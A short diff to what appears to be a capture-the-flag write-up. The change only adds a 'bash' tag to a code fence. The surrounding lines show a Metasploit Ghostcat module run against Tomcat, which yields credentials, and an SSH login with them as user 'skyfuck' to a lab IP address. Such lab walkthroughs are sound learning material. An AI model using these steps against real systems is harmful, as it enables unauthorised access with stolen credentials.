@@ -126,7 +126,7 @@ msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
 [*] Auxiliary module execution completed
 ```
 The output provide some credentials which we could use to connect with ssh:
-```
+```bash
 $ ssh skyfuck@10.10.142.154
 skyfuck@ubuntu:/home$ ls
 merlin  skyfuck
